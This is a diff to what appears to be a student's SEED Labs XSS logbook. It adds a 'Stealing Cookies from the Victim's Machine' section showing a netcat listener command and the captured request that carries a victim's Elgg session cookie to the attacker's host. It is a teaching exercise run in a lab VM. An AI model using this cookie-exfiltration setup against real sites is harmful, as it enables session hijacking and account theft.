@@ -14,6 +14,22 @@
 
 ## Task 3: Stealing Cookies from the Victim’s Machine
 
+![](./screenshots/logbook10_task3.png) 
+
+```sh
+[12/09/22]seed@VM:~/.../Labsetup$ nc -lknv 5555
+Listening on 0.0.0.0 5555
+Connection received on 10.0.2.7 56350
+GET /?c=Elgg%3Dlutf37jd6iap3futo623ouohpe HTTP/1.1
+Host: 10.9.0.1:5555
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
+Accept: image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Referer: http://www.seed-server.com/profile/samy
+```
+
 ## Task 4: Becoming the Victim’s Friend
 
 
